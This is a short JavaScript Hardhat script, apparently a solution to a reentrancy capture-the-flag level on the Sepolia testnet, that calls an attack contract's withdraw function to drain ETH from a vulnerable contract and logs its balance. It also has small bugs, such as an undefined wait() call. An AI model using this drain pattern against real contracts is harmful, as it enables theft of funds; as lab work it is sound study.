const {ethers} = require('hardhat');

const PRIVATE_KEY = process.env.PRIVATE_KEY;
const SECOND_PRIVATE_KEY = process.env.SECOND_PRIVATE_KEY;
const ALCHEMY_SEPOLIA_URL = process.env.ALCHEMY_SEPOLIA_URL;

const provider = new ethers.providers.JsonRpcProvider(ALCHEMY_SEPOLIA_URL);
const wallet1 = new ethers.Wallet(PRIVATE_KEY, provider);
const wallet2 = new ethers.Wallet(SECOND_PRIVATE_KEY, provider);

const Reentrance_Address = '0x1296aFd6CB80203042F87592165083EE8cb33082';
constReentrance_Json = require('../artifacts/contracts/Reentrance.sol/Reentrance.json');
const Reentrance_Abi = constReentrance_Json.abi;

const Attack_Reentrance_address= '0xB3feb6C2bC37DEC8A0C21b465266a99D9e6348eA';
const Attack_Reentrance_json = require('../artifacts/contracts/Reentrance.sol/Attack_Reentrance.json');
const Attack_Reentrance_abi = Attack_Reentrance_json.abi;

const Attack_Reentrance_contract = new ethers.Contract(Attack_Reentrance_address, Attack_Reentrance_abi,wallet1);




const kingContract = new ethers.Contract(Reentrance_Address, Reentrance_Abi, wallet1);

const main = async () => {
    let Reentrance_balance = await provider.getBalance(Reentrance_Address);
    console.log('Reentrance Contract ETH Balance:', ethers.utils.formatEther(Reentrance_balance));

    // const Attack_Reentrance = await ethers.getContractFactory("Attack_Reentrance");
    // const attackReentrance = await Attack_Reentrance.connect(wallet1).deploy("0x1296aFd6CB80203042F87592165083EE8cb33082",{value: ethers.utils.parseEther("0.001")});
    // await attackReentrance.deployed();
    // console.log("Attack_Reentrance contract address:", attackReentrance.address);

    //Attack_Reentrance contract address: 0xB3feb6C2bC37DEC8A0C21b465266a99D9e6348eA

    await Attack_Reentrance_contract.targetWithdraw();



    Reentrance_balance = await provider.getBalance(Reentrance_Address);
    console.log('Reentrance Contract ETH Balance:', ethers.utils.formatEther(Reentrance_balance));
    wait()
}

main()
    .then(() => process.exit(0))
    .catch(error => {
        console.error(error);
        process.exit(1);
    });
